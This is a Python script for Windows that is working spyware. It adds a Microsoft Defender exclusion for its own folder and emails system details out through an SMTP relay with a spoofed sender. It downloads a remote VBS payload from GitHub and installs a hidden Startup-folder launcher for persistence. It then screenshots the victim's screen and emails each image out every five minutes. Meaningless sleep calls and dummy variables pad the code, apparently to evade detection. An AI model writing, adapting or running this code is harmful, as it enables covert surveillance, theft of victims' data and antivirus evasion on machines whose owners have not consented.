import os
import time
import platform
import smtplib
import base64
import urllib.request
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from PIL import ImageGrab
import ctypes
import sys


x = 1 
folder = r"C:\core"
bypass = f"Add-MpPreference -ExclusionPath {folder}"
os.makedirs(folder, exist_ok=True)
os.system(f'powershell "{bypass}"')
print("done")
time.sleep(0)
time.sleep(0)
y = 5236.2564
time.sleep(0)
system = platform.system()
machine = platform.machine()
release = platform.release()
processor = platform.processor()
arch = platform.architecture()
uname = platform.uname()
x = y
time.sleep(0)
time.sleep(0)
data = system, machine, release, processor, arch, uname
global data_str
data_str = str(data).encode('utf-8')
with open('C:\\core\\data.txt', 'x') as f:
    f.write(data_str.decode('utf-8'))
z = 52226481
time.sleep(0)
time.sleep(0)
time.sleep(0)
email_sender = ''#your email
email_password = ''#email pass
email_receiver = "" #your email
email_subject = "hi"
spoof_email = ""#some ones email
s = x+y
time.sleep(0)
time.sleep(0)
time.sleep(0)
smtp_server = 'smtp-relay.sendinblue.com'
smtp_port = 587
time.sleep(0)
time.sleep(0)

email_msg = f"""\
From: {spoof_email}
To: {email_receiver}
Subject: {email_subject}

{data_str} 
"""
time.sleep(0)
time.sleep(0)
context = smtplib.ssl.create_default_context()
time.sleep(0)
time.sleep(0)
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls(context=context)
    server.login(email_sender, email_password)
    server.sendmail(email_sender, email_receiver, email_msg)
    print("[+] email send successfully!! ")




url = 'https://raw.githubusercontent.com/rusiru-19/starnet/main/sys.vbs'
directory = 'C:\core'
if not os.path.exists(directory):
    os.makedirs(directory)
filename = 'sys.vbs'
urllib.request.urlretrieve(url, os.path.join(directory, filename))



vbs_code = """
CreateObject("WScript.Shell").Run "C:\core\sys.vbs", 0, True
"""
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
vbs_path = os.path.join(startup_folder, "my_script.vbs")
with open(vbs_path, "w") as f:
    f.write(vbs_code)   



email_sender = '' #your email
email_password = ''#your email password
email_receiver = "" #your email
email_subject = "Screenshot"
spoof_email = "" #spoof email
smtp_server = 'smtp-relay.sendinblue.com'
smtp_port = 587


name = 0
while True:
    name += 1
    screenshot = ImageGrab.grab()
    screenshot.save(f'C:/core/{name}.png')

    email_msg = MIMEMultipart()
    email_msg['From'] = spoof_email
    email_msg['To'] = email_receiver
    email_msg['Subject'] = email_subject

    email_msg.attach(MIMEText("Screenshot taken at " + time.strftime("%Y-%m-%d %H:%M:%S")))

    with open(f'C:/core/{name}.png', 'rb') as f:
        img_data = f.read()
    img = MIMEImage(img_data, name=f'screenshot_{name}.png')
    email_msg.attach(img)

    context = smtplib.ssl.create_default_context()
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls(context=context)
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_receiver, email_msg.as_string())
        print("[+] email sent successfully!!")

    time.sleep(5 * 60)

    os.remove(f'C:/core/{name}.png')
